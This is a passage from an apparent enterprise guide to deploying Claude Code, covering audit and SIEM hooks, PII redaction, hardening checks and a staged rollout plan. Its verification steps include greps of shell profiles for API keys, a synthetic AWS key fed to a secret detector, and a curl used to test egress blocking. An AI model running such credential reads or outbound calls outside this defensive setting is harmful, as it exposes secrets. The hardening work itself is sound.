EXIT_CODE=$(echo "$PAYLOAD" | jq -r '.tool_response.exit_code // "unknown"')
SESSION_ID=$(echo "$PAYLOAD" | jq -r '.session_id // "unknown"')
TIMESTAMP=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
HOSTNAME=$(hostname -f)
USER_NAME="${USER:-unknown}"
PROJECT_ROOT=$(echo "$PAYLOAD" | jq -r '.project_root // "unknown"')

# Structured log entry
LOG_ENTRY=$(jq -n \
  --arg ts "$TIMESTAMP" \
  --arg host "$HOSTNAME" \
  --arg user "$USER_NAME" \
  --arg session "$SESSION_ID" \
  --arg cmd "$COMMAND" \
  --arg exit_code "$EXIT_CODE" \
  --arg project "$PROJECT_ROOT" \
  '{
    timestamp: $ts,
    hostname: $host,
    user: $user,
    session_id: $session,
    event_type: "claude_bash_execution",
    command: $cmd,
    exit_code: $exit_code,
    project: $project
  }'
)

# Write to local audit log
echo "$LOG_ENTRY" >> /var/log/claude-code/bash-audit.log

# Forward to SIEM via HTTP (non-blocking — run in background)
if [ -n "${SIEM_ENDPOINT:-}" ]; then
  curl -s -X POST "${SIEM_ENDPOINT}/events" \
       -H "Content-Type: application/json" \
       -H "Authorization: Bearer ${SIEM_TOKEN}" \
       -d "$LOG_ENTRY" \
       --max-time 5 \
       --retry 2 \
       --retry-delay 1 &
fi

exit 0  # Don't block — this is audit only
```

### Stop Hook: Session Summary to Ticketing System

When a Claude Code session ends, automatically create a summary and link it to the current ticket:

```bash
#!/usr/bin/env bash
# hooks/stop-session-summary.sh
# Posts session summary to Jira when session ends with completed work

PAYLOAD=$(cat)
SESSION_ID=$(echo "$PAYLOAD" | jq -r '.session_id // ""')
TRANSCRIPT=$(echo "$PAYLOAD" | jq -r '.transcript_summary // ""')
TOOLS_USED=$(echo "$PAYLOAD" | jq -r '[.tool_calls[].name] | unique | join(", ")' 2>/dev/null || echo "unknown")
COST_USD=$(echo "$PAYLOAD" | jq -r '.total_cost_usd // "0"')
TOKENS=$(echo "$PAYLOAD" | jq -r '.total_tokens // "0"')
PROJECT_ROOT=$(echo "$PAYLOAD" | jq -r '.project_root // ""')

# Extract Jira ticket from git branch name
BRANCH=$(git -C "$PROJECT_ROOT" branch --show-current 2>/dev/null || echo "")
TICKET=$(echo "$BRANCH" | grep -oE '[A-Z]+-[0-9]+' | head -1)

if [ -z "$TICKET" ] || [ -z "${JIRA_TOKEN:-}" ]; then
  exit 0  # No ticket found or no Jira config — skip silently
fi

# Create Jira comment
COMMENT_BODY=$(jq -n \
  --arg summary "$TRANSCRIPT" \
  --arg tools "$TOOLS_USED" \
  --arg cost "$COST_USD" \
  --arg tokens "$TOKENS" \
  --arg session "$SESSION_ID" \
  '{
    body: {
      type: "doc",
      version: 1,
      content: [{
        type: "paragraph",
        content: [{
          type: "text",
          text: ("Claude Code session " + $session + "\n\nSummary: " + $summary + "\n\nTools used: " + $tools + "\nCost: $" + $cost + " (" + $tokens + " tokens)")
        }]
      }]
    }
  }'
)

curl -s -X POST \
  "https://acme.atlassian.net/rest/api/3/issue/${TICKET}/comment" \
  -H "Authorization: Bearer ${JIRA_TOKEN}" \
  -H "Content-Type: application/json" \
  -d "$COMMENT_BODY" &

exit 0
```

### PrePrompt Hook: PII Redaction

Block or sanitise prompts containing PII before they reach the Claude API:

```python
#!/usr/bin/env python3
# hooks/pre-prompt-pii-redact.py
# Redacts PII from user prompts before sending to Claude

import json
import re
import sys

payload = json.load(sys.stdin)
prompt = payload.get("prompt", "")

# PII patterns to redact
PII_PATTERNS = [
    (r'\b\d{3}-\d{2}-\d{4}\b', '[SSN-REDACTED]'),        # US SSN
    (r'\b(?:\d[ -]?){13,16}\b', '[CARD-REDACTED]'),        # Credit card
    (r'\b\d{3}[-.]?\d{3}[-.]?\d{4}\b', '[PHONE-REDACTED]'), # US phone
    (r'\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,}\b', '[EMAIL-REDACTED]',),  # Email
    (r'\b(?:19|20)\d{2}[-/]\d{2}[-/]\d{2}\b', '[DOB-REDACTED]'),  # Date of birth
]

original = prompt
for pattern, replacement in PII_PATTERNS:
    prompt = re.sub(pattern, replacement, prompt, flags=re.IGNORECASE)

if prompt != original:
    # Log that redaction occurred (but not what was redacted)
    import datetime
    session_id = payload.get("session_id", "unknown")
    with open("/var/log/claude-code/pii-redaction.log", "a") as f:
        f.write(f"{datetime.datetime.utcnow().isoformat()}Z session={session_id} action=pii_redacted\n")

    # Output redacted prompt back to Claude Code
    # Stdout from PrePrompt hooks replaces the prompt
    print(prompt)
else:
    # No redaction needed — output unchanged
    print(prompt)

sys.exit(0)
```

### HTTP Handler: Forward All Events to SIEM

For centralised SIEM integration, use the `http` hook handler type to send all events without a shell intermediary:

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "hooks": [{
          "type": "http",
          "url": "https://siem.internal.acme.com/claude-code/pre-tool",
          "method": "POST",
          "headers": {
            "Authorization": "Bearer ${SIEM_TOKEN}",
            "X-Source": "claude-code",
            "X-Hostname": "${HOSTNAME}"
          },
          "timeout": 3000,
          "failOpen": true
        }]
      }
    ],
    "PostToolUse": [
      {
        "hooks": [{
          "type": "http",
          "url": "https://siem.internal.acme.com/claude-code/post-tool",
          "method": "POST",
          "headers": {
            "Authorization": "Bearer ${SIEM_TOKEN}"
          },
          "timeout": 3000,
          "failOpen": true
        }]
      }
    ],
    "SessionEnd": [
      {
        "hooks": [{
          "type": "http",
          "url": "https://siem.internal.acme.com/claude-code/session-end",
          "method": "POST",
          "headers": {
            "Authorization": "Bearer ${SIEM_TOKEN}"
          },
          "timeout": 5000,
          "failOpen": true
        }]
      }
    ]
  }
}
```

`"failOpen": true` means if the SIEM endpoint is unreachable, Claude Code continues working rather than blocking. Set `"failOpen": false` only if your compliance posture requires blocking on SIEM failure (rare; use with caution as it will stop all developer work during SIEM outages).

### Comprehensive Compliance Hook Configuration

Full `hooks` block combining all patterns above:

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Write|Edit|MultiEdit",
        "hooks": [
          {
            "type": "command",
            "command": "/opt/acme/hooks/pre-file-write-secrets.sh",
            "timeout": 10000,
            "description": "Secret detection — blocks writes containing credentials"
          }
        ]
      },
      {
        "hooks": [
          {
            "type": "http",
            "url": "https://siem.internal.acme.com/events",
            "method": "POST",
            "headers": {"Authorization": "Bearer ${SIEM_TOKEN}"},
            "timeout": 2000,
            "failOpen": true,
            "description": "SIEM pre-tool event"
          }
        ]
      }
    ],
    "PostToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "command",
            "command": "/opt/acme/hooks/post-bash-audit.sh",
            "timeout": 5000,
            "description": "Audit log for all bash executions"
          }
        ]
      }
    ],
    "SessionEnd": [
      {
        "hooks": [
          {
            "type": "command",
            "command": "/opt/acme/hooks/stop-session-summary.sh",
            "timeout": 15000,
            "description": "Post session summary to Jira ticket"
          }
        ]
      }
    ]
  }
}
```

---

## 10. Security Hardening Checklist

### Deployment Hardening

```
[ ] DISABLE_UPDATES=1 set in managed settings (production environments)
    Rationale: Prevents untested version upgrades in production. A new version could
    introduce changed tool behaviours, new permissions, or modified policy handling
    that hasn't gone through your internal review process.
    Implementation: set in managed-settings.json "env": {"DISABLE_UPDATES": "1"}
    Verification: claude --version (run after trying 'claude update' — should fail)

[ ] disableTelemetryOverride=true set in managed settings
    Rationale: Telemetry is required for cost attribution and compliance auditing.
    Without it, you cannot demonstrate to auditors what Claude Code did in a given session.
    Also prevents developers from using DISABLE_TELEMETRY=1 to avoid audit trail.
    Implementation: "disableTelemetryOverride": true in managed-settings.json
    Verification: sudo -u $ENGINEER_USER env | grep DISABLE_TELEMETRY → should be unset
                  or OTEL dashboard should show sessions for all active engineers

[ ] Auto-update disabled on developer machines via MDM
    Rationale: Same as DISABLE_UPDATES but enforced at the OS level so it persists
    even if managed-settings.json is temporarily unavailable.
    Implementation (macOS Jamf): set DisableAutoUpdate=true in mobileconfig payload
    Implementation (Windows Intune): DisableAutoUpdate REG_DWORD=1 in policy key
    Verification: claude config get autoUpdate → should return false (managed)

[ ] Version pinned in Dockerfile and CI base images
    Rationale: Floating 'latest' means a new Claude Code version could silently change
    CI behaviour between runs — breaking reproducibility and introducing untested changes.
    Example: RUN npm install -g @anthropic-ai/claude-code@2.1.126
    Also: RUN claude --version | grep -qF "2.1.126" || exit 1  ← fail fast on version mismatch
    For native binary deployments: use SHA256 checksum verification after download

[ ] bypassPermissions / dangerously-skip-permissions NEVER used outside sandboxed environments
    Rationale: bypassPermissions disables all tool confirmation and permission checks.
    In a non-ephemeral environment, Claude Code can make arbitrary file system changes
    without any human confirmation loop.
    Policy: CI/CD jobs that use bypassPermissions MUST run inside Docker containers
    on ephemeral runners (GitHub Actions, GCP Cloud Build, AWS CodeBuild) — never on
    long-lived shared runners or developer laptops.
    Enforcement: add this check to your pre-CI gate:
      if grep -r 'bypassPermissions\|dangerously-skip-permissions' .github/; then
        grep -l 'runs-on: self-hosted' .github/workflows/*.yml && exit 1
      fi

[ ] ANTHROPIC_API_KEY stored in vault, not .env files or shell profiles
    Rationale: .env files are frequently accidentally committed. ~/.bashrc and ~/.zshrc
    are readable by other processes on the same machine. The key should exist only in
    the vault and be injected at runtime.
    Implementation (HashiCorp Vault): vault agent sidecar writes key to tmpfs mount
    Implementation (AWS): AWS Secrets Manager via IAM role — no static key needed
    Implementation (GCP Vertex): Workload Identity Federation — no key at all
    Verification: grep -r 'ANTHROPIC_API_KEY\s*=' ~/.bashrc ~/.zshrc ~/.env* 2>/dev/null
                  → should return nothing

[ ] Claude Code not run as root or SYSTEM
    Rationale: If Claude Code is compromised or makes an error, running as root means
    it can modify system files, install software, or alter other users' data.
    Running as a normal user limits the blast radius to that user's home directory.
    Implementation: in CI/CD, check: if [ "$(id -u)" = "0" ]; then exit 1; fi
    Implementation: in Docker, add USER 1000 before the claude invocation
    Implementation: in Kubernetes, set securityContext.runAsNonRoot: true

[ ] Outbound network from Claude Code processes restricted to approved endpoints
    Rationale: Claude Code's Bash tool can make arbitrary outbound network calls.
    Without network policy, a misbehaving prompt could exfiltrate data via curl/wget.
    Implementation (Linux iptables — per-user policy):
      iptables -A OUTPUT -m owner --uid-owner $CLAUDE_USER -d api.anthropic.com -j ACCEPT
      iptables -A OUTPUT -m owner --uid-owner $CLAUDE_USER -j REJECT
    Implementation (Kubernetes NetworkPolicy): restrict egress to approved CIDR blocks
    Implementation (Windows): Windows Firewall outbound rules per application path
    Approved endpoints: api.anthropic.com:443, bedrock-runtime.*.amazonaws.com:443,
                        *-aiplatform.googleapis.com:443, your MCP server IPs, OTEL collector IP
    Verification: run 'curl https://httpbin.org/get' inside a Claude Code Bash session
                  → should be blocked (connection refused or timeout)

[ ] Managed settings file permissions hardened (Linux/macOS)
    Rationale: If a non-root user can write to managed-settings.json, they can remove
    budget caps, disable telemetry, or expand permissions.
    Implementation: chown root:root /etc/claude-code/managed-settings.json
                    chmod 644 /etc/claude-code/managed-settings.json
    Verification: sudo -u $ENGINEER_USER touch /etc/claude-code/managed-settings.json
                  → should fail with "Permission denied"

[ ] OTEL data does not contain conversation content or file content
    Rationale: OTEL data is broadly accessible to your observability team. Conversation
    content (what users typed to Claude) and file content (what Claude read) may contain
    sensitive business logic or PII.
    Verification: inspect a raw span in your OTEL backend — confirm 'tool.input' attributes
    contain only file paths and command strings (not file contents), and that no span
    attribute contains conversation text verbatim.
    If needed: add a processor in the OTEL collector to redact specific attributes:
      transform/redact:
        trace_statements:
        - context: span
          statements:
          - delete(attributes["user.prompt"])   # remove if present
```

### Telemetry Configuration

Claude Code collects the following telemetry by default:

| Data Type | Collected | Contains PII? | Notes |
|-----------|----------|--------------|-------|
| Command invocations | Yes | No | Command names, flags — no content |
| Crash reports | Yes | Potentially (stack traces) | Disable if sensitive |
| Performance metrics | Yes | No | Latency, memory |
| Feature usage | Yes | No | Which features are used |
| Conversation content | **No** | N/A | Content never leaves your machine/cloud |
| File content | **No** | N/A | File names logged, not content |

To disable telemetry entirely:

```bash
export DISABLE_TELEMETRY=1
# Or in managed settings (prevents user re-enabling):
# "disableTelemetryOverride": true  — this forces DISABLE_TELEMETRY=1
```

### Sandbox Mode in CI

In CI/CD pipelines, always run inside a proper sandbox before using `bypassPermissions`:

```yaml
# .github/workflows/claude-ci.yml — correct sandbox setup
jobs:
  claude-task:
    runs-on: ubuntu-latest  # Ephemeral GitHub-hosted runner
    container:
      image: node:20-slim     # Isolated container
      options: --security-opt seccomp=unconfined  # Required for claude sandbox

    steps:
    - uses: actions/checkout@v4

    - name: Install Claude Code
      run: npm install -g @anthropic-ai/claude-code@2.1.126

    - name: Run task
      env:
        ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
      run: |
        # bypassPermissions is safe here because:
        # 1. Ephemeral GitHub Actions runner
        # 2. Inside container
        # 3. Destroyed after job
        claude --print "${{ inputs.task }}" \
               --permission-mode bypassPermissions \
               --max-turns 30 \
               --max-budget-usd 5.00 \
               --bare
```

### Network Policy

Restrict Claude Code network access to approved endpoints only:

```
APPROVED OUTBOUND ENDPOINTS:
  api.anthropic.com:443                      # Direct API
  bedrock-runtime.<region>.amazonaws.com:443 # AWS Bedrock
  <region>-aiplatform.googleapis.com:443     # GCP Vertex AI
  mcp.internal.acme.com:443                  # Internal MCP server
  otel.internal.acme.com:4318               # OTEL collector

BLOCK ALL OTHER OUTBOUND from Claude Code processes
  (implement via iptables, AWS Security Group, or GCP VPC firewall)
```

### RBAC for MCP Tool Access

Implement role-based access control at the MCP server layer:

```python
# mcp_server/rbac.py
TOOL_ROLES = {
    "internal_db_query":           ["all-engineers"],
    "internal_db_write":           ["staff-engineers", "data-engineers"],
    "vault_get_secret":            ["all-engineers"],
    "vault_write_secret":          ["staff-engineers", "platform-team"],
    "deploy_service":              ["senior-engineers", "staff-engineers"],
    "deploy_service_production":   ["staff-engineers"],
    "pagerduty_create_incident":   ["all-engineers"],
    "billing_data_query":          ["data-engineers", "staff-engineers"],
}

async def check_tool_permission(tool_name: str, user_groups: list[str]) -> bool:
    """Returns True if the user's groups include any role allowed to call this tool."""
    allowed_roles = TOOL_ROLES.get(tool_name)
    if allowed_roles is None:
        return False  # Unknown tools are denied by default

    return any(
        role in allowed_roles
        for role in user_groups + ["all-engineers"]  # all-engineers is universal
    )
```

---

## 11. Team CLAUDE.md Governance

### Hierarchy for Multi-Team Organisations

Claude Code loads CLAUDE.md files in a defined hierarchy. For enterprise, this maps cleanly to organisational levels:

```
LOAD ORDER (first loaded = lowest priority; last loaded = highest override)
──────────────────────────────────────────────────────────────────────────

1. Enterprise CLAUDE.md        ← From @acme/claude-standards plugin
   /opt/acme/plugin/CLAUDE.md
   Contains: security policy, PII handling, internal tool usage, org identity
   Audience: all engineers at Acme
   Managed by: Platform team
   Update cycle: quarterly or on policy change

2. Division CLAUDE.md          ← From @acme/claude-payments plugin
   ~/.claude/plugins/@acme/claude-payments/CLAUDE.md
   Contains: payments domain conventions, PCI-DSS guidelines, API contracts
   Audience: all engineers in the Payments division
   Managed by: Payments platform lead
   Update cycle: monthly

3. Team CLAUDE.md              ← Distributed via team plugin or git submodule
   ~/.claude/CLAUDE.md (user-level)
   Contains: team norms, local tooling, sprint context
   Audience: team members only
   Managed by: tech lead
   Update cycle: per sprint

4. Project CLAUDE.md           ← Checked into the repo
   ./CLAUDE.md
   Contains: project-specific conventions, architecture, testing patterns
   Audience: anyone working on this project
   Managed by: project maintainers
   Update cycle: as needed

5. CLAUDE.local.md             ← Git-ignored personal overrides
   ./CLAUDE.local.md
   Contains: personal shortcuts, local env paths, personal conventions
   Audience: individual developer only
   Never committed, never shared
```

### @import Chains for Shared Sections

Use `@import` to compose CLAUDE.md from shared sections without duplication:

```markdown
<!-- Enterprise CLAUDE.md (in plugin) -->
# Acme Corp Standards

@import ./shared/security-baseline.md      ← same file reused by all divisions
@import ./shared/internal-tools.md
@import ./shared/logging-standards.md

<!-- Division CLAUDE.md -->
# Payments Division Standards

@import https://raw.githubusercontent.com/acme-corp/standards/v2.4/security-baseline.md

## Payments-Specific

All payment processing must comply with PCI-DSS v4.0.
Card data must never appear in logs, traces, or AI context.
```

The `@import` path can be:
- Relative to the CLAUDE.md file: `@import ./section.md`
- Absolute path: `@import /etc/acme/claude/baseline.md`
- URL (fetched once at session start): `@import https://internal.acme.com/claude/v2/security.md`

### Versioning via Git Submodules

For teams that prefer git over npm plugins:

```bash
# Add shared standards as a git submodule
git submodule add https://git.internal.acme.com/platform/claude-standards.git \
  .claude/shared

# Reference from CLAUDE.md
# @import .claude/shared/security-baseline.md

# Update to latest
git submodule update --remote .claude/shared

# Pin to a specific version
cd .claude/shared && git checkout v2.4.1 && cd ../..
git add .claude/shared && git commit -m "chore: pin claude-standards to v2.4.1"
```

### Template Registry for New Projects

Provide a template registry so new projects start with the right CLAUDE.md:

```bash
#!/usr/bin/env bash
# claude-init — run when creating a new project
# Usage: claude-init [template-name]

TEMPLATE_REGISTRY="https://git.internal.acme.com/platform/claude-templates"
TEMPLATE="${1:-default}"

case "$TEMPLATE" in
  api)       TEMPLATE_PATH="api-service" ;;
  frontend)  TEMPLATE_PATH="frontend-app" ;;
  data)      TEMPLATE_PATH="data-pipeline" ;;
  infra)     TEMPLATE_PATH="infrastructure" ;;
  *)         TEMPLATE_PATH="default" ;;
esac

# Fetch template
curl -sL "${TEMPLATE_REGISTRY}/raw/main/${TEMPLATE_PATH}/CLAUDE.md" \
  > ./CLAUDE.md

# Substitute project-specific variables
PROJECT_NAME=$(basename "$(pwd)")
sed -i "s/{{PROJECT_NAME}}/${PROJECT_NAME}/g" ./CLAUDE.md
sed -i "s/{{DATE}}/$(date +%Y-%m-%d)/g" ./CLAUDE.md
sed -i "s/{{TEAM}}/$(git config user.team 2>/dev/null || echo 'unknown')/g" ./CLAUDE.md

mkdir -p .claude/rules .claude/skills

echo "Initialised CLAUDE.md from template: ${TEMPLATE_PATH}"
echo "Edit ./CLAUDE.md to add project-specific details."
```

### Token Budget Governance

CLAUDE.md content is loaded into every session. Bloated CLAUDE.md files waste tokens and reduce cache efficiency. Enforce size targets:

| Scope Level | Target Token Size | Hard Max | Notes |
|-------------|-----------------|----------|-------|
| Enterprise (plugin) | 800–1,500 tokens | 3,000 | Security policy, internal tools |
| Division plugin | 400–800 tokens | 1,500 | Domain conventions |
| Team (`~/.claude/CLAUDE.md`) | 300–600 tokens | 1,000 | Team norms only |
| Project (`./CLAUDE.md`) | 500–1,500 tokens | 3,000 | Project-specific details |
| `CLAUDE.local.md` | 100–300 tokens | 500 | Personal overrides only |
| **Total loaded** | **2,000–4,500 tokens** | **8,000** | Above this, costs grow |

Check token count:

```bash
# Estimate tokens in CLAUDE.md (rough: 4 chars ≈ 1 token)
wc -c CLAUDE.md | awk '{printf "Estimated tokens: %d\n", $1/4}'

# Or count via Claude Code itself
claude --print "Count the tokens in the loaded CLAUDE.md context" \
       --permission-mode plan \
       --max-turns 1
```

---

## 12. Organisational Rollout Playbook

### Phase 0: Pre-Deployment Infrastructure (Week 0)

**Objective:** Stand up the shared infrastructure before any developer sees Claude Code. Nothing should be deployed to developer machines until this phase is complete and verified.

**Who:** Platform team only (2–3 engineers). This work is invisible to developers.

**Infrastructure checklist:**

```
[ ] OTEL collector cluster deployed (2 replicas minimum, health checks passing)
    Test: curl https://otel.internal.acme.com:4318/v1/traces -d '{}' → 400 (endpoint live)

[ ] Grafana dashboards imported and showing data from test spans
    Test: send a synthetic span, confirm it appears within 60 seconds

[ ] MCP server cluster deployed (if applicable)
    Test: call each tool endpoint and verify expected response

[ ] Bedrock or Vertex AI access confirmed in target region
    Test: aws bedrock invoke-model or gcloud ai predict (returns valid response)

[ ] managed-settings.json authored and validated (JSON linting passes)
    Test: python3 -m json.tool /etc/claude-code/managed-settings.json

[ ] MDM profile (.mobileconfig / ADMX / Ansible playbook) drafted
    Test: deploy to one test machine (not a developer machine) and verify settings apply

[ ] Enterprise plugin (@acme/claude-standards) published to private npm registry
    Test: npm install @acme/claude-standards --registry https://npm.internal.acme.com

[ ] Compliance hooks unit-tested with synthetic payloads
    Test: echo '{"tool_input": {"content": "AKIA1234567890ABCDEF"}}' | ./pre-file-write-secrets.sh
         → should exit 2 (blocked) and print "SECRET DETECTED"

[ ] Budget caps confirmed working (test with very low cap)
    Test: ANTHROPIC_BUDGET_USD_CAP=0.001 claude --print "hello" → budget_exceeded error

[ ] Internal wiki page created: "How to use Claude Code at Acme"
    Content: install instructions, supported models, how to get help
```

This phase should take 3–5 business days. Do not proceed to Phase 1 until every checkbox is verified — remediation is much harder when 50+ developers are already live.

### Phase 1: Platform Team Pilot (Weeks 1–2)

**Objective:** Prove the deployment pipeline and baseline configuration under real-world workloads from engineers who know the system well enough to diagnose and report issues precisely.

**Who:** 5–10 platform team engineers who understand the configuration deeply. These engineers are the "canary" — they use Claude Code for real work (not just testing), which surfaces real-world issues like hook false positives on legitimate code patterns.

**What the pilot engineers actually do:**

- Use Claude Code daily as part of their normal workflow (not just testing)
- File a JIRA ticket for any friction point, false positive, or unexpected behaviour
- Record their actual daily cost (from `claude config get` or OTEL dashboard) so you have real baseline data
- Try edge cases: large files, long sessions, complex multi-file refactors, CI/CD usage

**Setup checklist:**

```
Week 1 — Day 1:
[ ] Deploy managed-settings.json to pilot machines via MDM
    Verify: all 5–10 machines show correct values via 'claude config get model'

[ ] Install enterprise plugin (@acme/claude-standards) on pilot machines
    Verify: claude plugins list | grep @acme/claude-standards shows correct version

[ ] Configure OTEL exporter on pilot machines → verify traces appear in Grafana within 5 min
    Verify: filter dashboard by session.user = each pilot engineer, confirm spans appear

[ ] Brief pilot engineers (30-min walkthrough of what to expect and how to file feedback)

Week 1 — Days 2–5:
[ ] Pilot engineers use Claude Code for real work (not just demos)
[ ] Monitor OTEL dashboard daily for cost anomalies or error patterns
[ ] Triage any hook false positives same-day (false positives block work → P1 priority)

Week 2:
[ ] Analyse cost data: actual vs. projected per engineer
    If > 30% over projection: investigate which operations drove cost (check tool_calls in traces)
    If < 50% of projection: check adoption — are pilots actually using it?

[ ] Fix any hook failures or false positives identified in Week 1
    Deploy fix to pilot machines and verify resolution before proceeding

[ ] Establish cost baseline: median and p90 cost per developer per day
    Formula: pull 'cost.usd' metric from Grafana, compute median and 90th percentile

[ ] Create onboarding runbook (document what you learned, not just what was planned)
[ ] Record pilot success metrics (see criteria below)
[ ] Go/no-go decision for Phase 2
```

**Success criteria for Phase 1 (go/no-go gate):**
- All 5–10 pilot engineers actively using Claude Code daily (measured from OTEL active session count)
- Zero compliance hook false positives causing workflow disruption in Week 2 (Week 1 may have some; they should be fixed)
- OTEL traces appearing in dashboard for 100% of sessions (spot-check 3 engineers)
- Cost per developer per day within 30% of projected (not 20% — pilot is abnormal use, broader rollout normalises)
- No secrets committed to any repository during pilot (verify via `git log --all --diff-filter=A` scan)
- MDM deployment confirmed working on all 3 OS types present in your fleet (even if pilot is all Mac, test Windows/Linux policies in the lab before Phase 2)

### Phase 2: Early Adopter Cohort (Weeks 3–6)

**Objective:** Validate that the configuration works across diverse team types, tech stacks, and OS environments. Collect structured feedback to refine before the broad rollout. Early adopters should be enthusiastic volunteers — engineers who want the tool, not engineers who were assigned to test it.

**Who:** 40–60 engineers, deliberately diverse across multiple axes:
- **Stack diversity:** 2–3 frontend (TypeScript/React), 2–3 backend (Java/Go/Python), 2–3 platform (Kubernetes/Terraform), 1–2 data engineers (Python/SQL), 1–2 mobile (Swift/Kotlin)
- **OS diversity:** ~60% macOS, ~30% Linux, ~10% Windows (reflect your actual fleet composition)
- **Seniority diversity:** juniors, seniors, and staff — each tier uses Claude Code differently and hits different budget/permission limits
- **Team diversity:** pick from 4–5 different business teams, not all from one division

**Why this diversity matters:** Your compliance hooks are written against patterns from one team. Another team's legitimate code will find false positives you never anticipated. A data engineer's Bash commands look very different from a frontend engineer's — your permission policy must work for both.

**Rollout steps:**

```bash
# Week 3: Staged rollout to early adopters
for MACHINE in $(ldap_get_machines "group=early-adopters"); do
  ssh "$MACHINE" "bash /opt/acme/scripts/install-claude-enterprise.sh"
  sleep 10  # stagger to avoid MDM stampede
done
```

**Feedback collection (week 4):**

Deploy a `SessionEnd` hook that collects structured feedback:

```bash
#!/usr/bin/env bash
# hooks/session-feedback-collector.sh
# Every 5th session, prompt for quick feedback (non-blocking)

SESSION_COUNT_FILE="$HOME/.claude/.session-count"
COUNT=$(cat "$SESSION_COUNT_FILE" 2>/dev/null || echo "0")
NEW_COUNT=$((COUNT + 1))
echo "$NEW_COUNT" > "$SESSION_COUNT_FILE"

if [ $((NEW_COUNT % 5)) -eq 0 ]; then
  # Non-blocking background feedback prompt
  (
    RESPONSE=$(zenity --entry \
      --title="Claude Code Feedback" \
      --text="Quick feedback (optional): What could be better?" \
      --timeout=30 2>/dev/null || echo "")

    if [ -n "$RESPONSE" ]; then
      curl -s -X POST "https://feedback.internal.acme.com/claude" \
        -H "Content-Type: application/json" \
        -d "{\"user\": \"$USER\", \"feedback\": \"$RESPONSE\", \"session\": \"${SESSION_ID:-}\"}"
    fi
  ) &
fi
```

**What to watch for in the OTEL data during Phase 2:**

The most actionable signal from the early adopter cohort is not the feedback survey — it's the tool call error rate in your OTEL traces. Filter your Grafana dashboard to:

```promql
# Permission denial rate — spikes indicate over-restrictive policy
rate(claude_code_permission_denied_total[1h])
/
rate(claude_code_tool_calls_total[1h])
# Target: < 5% of tool calls are denied (higher = policy too strict for real-world work)

# Hook block rate — spikes indicate false positives
rate(claude_code_hook_blocked_total[1h])
/
rate(claude_code_tool_calls_total[1h])
# Target: < 1% of tool calls are blocked by hooks (false positives destroy adoption)

# Session abandon rate — sessions that start but don't complete a tool call
# High = developers are hitting friction before even getting started
1 - (
  count_over_time(claude_code_tool_calls_total[24h]) > 0
  /
  count_over_time(claude_code_sessions_total[24h]) > 0
)
```

If permission denial rate exceeds 5%, review which tools are being denied (check `deny.reason` attribute in the `permission.denied` spans) and consider relaxing the allowlist for legitimate patterns.

**Phase 2 success criteria:**
- Net Promoter Score ≥ 7 from feedback survey (eNPS-style: 0–10, target ≥ 7 average)
- ≥ 70% of cohort using Claude Code ≥ 3 days per week (from OTEL `session.start` counts by user)
- No P1 incidents caused by Claude Code
- Cost per developer trending ≤ projected budget (use the formula from §7 with actual empirical values)
- Hook false positive rate < 2% of sessions (measured as sessions where a hook blocked but the engineer's intent was legitimate — distinguish from genuine secret detections)
- Permission denial rate < 5% of tool calls (from OTEL `permission.denied` span count)

### Phase 3: Broad Rollout (Weeks 7–16)

**Objective:** Roll out to all 500+ engineers in phased waves by team, with automated deployment, a live support channel, and clear rollback criteria at each wave boundary.

**What "broad rollout" actually involves at each wave:** Wave 1 is not "just deploying to 80 more people" — it is the first time your configuration meets the full diversity of the engineering organisation. At this scale, even a 1% false positive rate means ~5 engineers per wave who hit a blocking issue. Have a dedicated support rotation (1 platform engineer per wave, on-call during business hours) who triages Slack `#claude-code-help` messages same-day.

**Wave acceptance criteria (before starting each wave):**
- Previous wave has been running for ≥ 5 business days with no P1 incidents
- Previous wave NPS is ≥ 7
- Previous wave permission denial rate is < 5% and stable (not trending up)
- Previous wave cost per developer is within 25% of projection

**Wave schedule (adjust to your org size):**

| Wave | Engineers | Teams | Duration | Notes |
|------|----------|-------|---------|-------|
| 1 | 50–80 | 3–4 teams, vary by stack | 1 week | Monitor closely |
| 2 | 100–150 | 5–8 teams | 1 week | Incorporate Wave 1 learnings |
| 3 | 200–250 | All remaining | 2 weeks | Full support channel active |
| 4 | Remaining | Holdouts + new hires | Ongoing | Standard onboarding |

**Automated rollout script:**

```bash
#!/usr/bin/env bash
# rollout-wave.sh <wave-number>
# Usage: rollout-wave.sh 2

WAVE="$1"
WAVE_FILE="/opt/acme/rollout/wave-${WAVE}.txt"

if [ ! -f "$WAVE_FILE" ]; then
  echo "Wave file not found: $WAVE_FILE"
  exit 1
fi

SUCCESS=0
FAILED=0

while IFS= read -r LDAP_USER; do
  MACHINE=$(ldap_get_primary_machine "$LDAP_USER")
  if ssh -o ConnectTimeout=5 "$MACHINE" \
       "bash /opt/acme/scripts/install-claude-enterprise.sh" 2>/dev/null; then
    echo "OK: $LDAP_USER ($MACHINE)"
    ((SUCCESS++))
  else
    echo "FAIL: $LDAP_USER ($MACHINE)" >&2
    ((FAILED++))
  fi
  sleep 2
done < "$WAVE_FILE"

echo ""
echo "Wave $WAVE complete: $SUCCESS succeeded, $FAILED failed"
if [ $FAILED -gt 0 ]; then
  echo "Failed machines logged to /var/log/claude-rollout-wave${WAVE}-failures.log"
fi
```

### Success Metrics

Track these KPIs from the OTEL dashboard, reported weekly:

| Metric | Target (6 months post-rollout) | Notes |
|--------|-------------------------------|-------|
| Active users / total users | ≥ 75% | Active = used Claude Code ≥ once in last 7 days |
| Daily active users | ≥ 50% | Indicator of deep adoption |
| Cost per developer per month | < $200 | Adjust based on model policy |
| Cache hit rate org-wide | > 50% | Indicator of CLAUDE.md quality |
| Hook false positive rate | < 1% of sessions | Higher = disruption, lower adoption |
| Secrets blocked by hooks | Track count | Any > 0 validates the investment |
| Time-to-feature (sprint metric) | 15–25% reduction | Survey-based, compare pre/post |
| PR review cycle time | 20–30% reduction | Measurable from git/Jira |

### Common Objections and Responses

**"AI will commit bad code to our repos"**

Response: Claude Code requires developer approval for all commits — it never pushes automatically. The `Bash(git push *)` tool is explicitly in our allowlist only for engineers who opt in. All file writes go through `PreFileWrite` hooks with secret detection. The developer remains the decision-maker; Claude Code is a highly capable assistant, not an autonomous agent in production.

**"We can't send our code to a third-party API"**

